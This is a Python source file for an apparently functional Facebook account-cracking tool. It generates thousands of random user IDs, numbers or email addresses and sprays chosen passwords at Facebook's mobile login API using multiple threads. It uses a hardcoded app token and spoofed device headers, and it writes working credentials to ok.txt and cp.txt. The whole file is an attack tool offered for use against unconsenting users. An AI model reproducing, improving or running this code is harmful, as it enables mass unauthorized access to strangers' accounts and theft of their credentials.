W = '\033[97;1m' 

R = '\033[91;1m' 

G = '\033[92;1m' 

Y = '\033[93;1m' 

B = '\033[94;1m'

P = '\033[95;1m'

C = '\033[96;1m'

N = '\x1b[0m'

import os

try:

	import requests

except ImportError:

	os.system("pip install requests")



try:

	import concurrent.futures

except ImportError:

	os.system("pip install futures")



import os

import sys

import time

import requests

import random

import platform

from concurrent.futures import ThreadPoolExecutor



class Main:

	def __init__(self):

		self.id = []

		self.ok = []

		self.cp = []

		self.loop = 0

		os.system("clear")
		print('''
\033[97;1m██████╗      \033[91;1m  █████\033[92;1m█╗██╗     
██\033[93;1m╔══██╗      ██╔════╝██║     
██████╔╝██\033[96;1m███╗██║     ██║     
██╔══██╗╚════╝██║  \033[93;1m   ██\033[95;1m║     
██║  ██║      ╚██████\x1b[0m╗█████\033[96;1m██╗
╚═╝  ╚═╝       ╚═════╝╚══════╝''')
		print("%s [%s庐%s] %sTOOL NAME : %sOLD CLONER"%(G,R,G,Y,G))

		print("%s [%s庐%s] %sVERSION   : %s2.0 "%(G,R,G,Y,G))

		print("%s [%s庐%s] %sSTATUS    : %sF R E E"%(G,R,G,Y,G))
		print("\033[92;1m        AUTHOR : Rihan Ahmed      ")
		print("\n%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 %s"%(G,R,G,Y,W))

		print("%s [%s2%s]%s CRACK FB ID 2015-22 %s"%(G,R,G,Y,G))

		print("%s [%s3%s]%s CRACK FROM NUMBER  %s"%(G,R,G,Y,G))

		print("%s [%s4%s]%s CRACK FB ID 2004-5%s"%(G,R,G,Y,G))

		print("%s [%s5%s]%s CRACK FROM EMAILS %s"%(G,R,G,Y,G))

		print("%s [%s6%s]%s CRACK FB ID CUSTOM %s"%(G,R,G,Y,G))

		print("%s [%s7%s]%s FOLLOW ME ON FACEBOOK %s"%(G,R,G,Y,G))
		print("\033[92;5m         GIVE RESPECT     GET RESPECT    ")
		hoga = input("\n%s [?] CHOICE : "%(Y))

		if hoga in ["", " "]:

			Main()

		elif hoga in ["1", "01"]:

			self.fbtua()

		elif hoga in ["2", "02"]:

				self.old4_7()

		elif hoga in ["3", "03"]:

				self.old4_6()

		elif hoga in ["4", "04"]:

				self.old4_5()

		elif hoga in ["5", "05"]:

				self.email()

		elif hoga in ["6","06"]:

				self.oldcrack()

		elif hoga in ["7", "07"]:

			os.system('am start https://www.facebook.com/white.hat.hacker.Rihan')

		else:

			Main()



	def fbtua(self):

		x = 111111111

		xx = 999999999

		idx = "100000"

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;97m(50000MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(G))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;96m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))



	def old_9(self):

		x = 11111111111

		xx = 1799999999

		idx = "1000"

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,W,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

		

	def old4_7(self):

		x = 11111111

		xx = 99999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))





	def old4_6(self):

		x = 11111111

		xx = 99999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["016", "017", "018", "019", "013", "014", "015", "017", "019"])

		limit = int(input("\033[092m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR"%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		



	def old4_5(self):

		x = 111111

		xx = 999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))  

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))





	def email(self):

		x = 111

		xx = 999

		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " SNIGDHO): "%(Y,G))

		nam = nam.replace(" ", "")

		print("%s EXAMPLE  : %s@gmail.com, @yahoo.com, @hotmail.com ETC"%(Y,G))

		idx = input("%s DOMAIN  : "%(B))

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				___ = nam

				self.id.append(___+str(_)+__)

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 

				listpass = input(" [?] ENTER PASSWORD : ")

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULT SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		

	def oldcrack(self):

		x = 11111111

		xx = 99999999

		idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))

		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])

		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))

		if (limit)>50000:

			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))

		try:

			for n in range(limit):

				_ = random.randint(x,xx)

				__ = idx

				self.id.append(__+str(_))

			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 

			with ThreadPoolExecutor(max_workers=30) as coeg:

				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))

				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))

				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))

				if len(listpass)<=5:

					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))

				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))

				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))

				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))

				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))

				for user in self.id:

					coeg.submit(self.api, user, listpass.split(","))

			exit("\n\n%s [#] CRACK COMPLETE..."%(G))

		except Exception as e:exit(str(e))

		



	def api(self, uid, pwx):

		ua = random.choice([

			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 

			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"

		])

		sys.stdout.write(

			"\r\r %s\033[0;93m[ BHHC Hackers: \033[0;97m %s/%s -> \033[0;92m [OK:%s ]- \033[0;93m[CP%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))

		); sys.stdout.flush()

		for pw in pwx:

			pw = pw.lower()

			ses = requests.Session()

			headers = {

				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 

				"x-fb-sim-hni": str(random.randint(20000, 40000)), 

				"x-fb-net-hni": str(random.randint(20000, 40000)), 

				"x-fb-connection-quality": "EXCELLENT",

				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",

				"user-agent": ua, 

				"content-type": "application/x-www-form-urlencoded", 

				"x-fb-http-engine": "Liger"

			}

			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 

			if "session_key" in response.text and "EAAA" in response.text:

				print("\r \033[0;92m[Rihan-OK] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("OK] %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r \033[0;93m[Ops- CP] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" CP] %s|%s\n"%(uid, pw))

				break

			else:

				continue



		self.loop +=1





try:Main()

except Exception as e:exit(str(e))


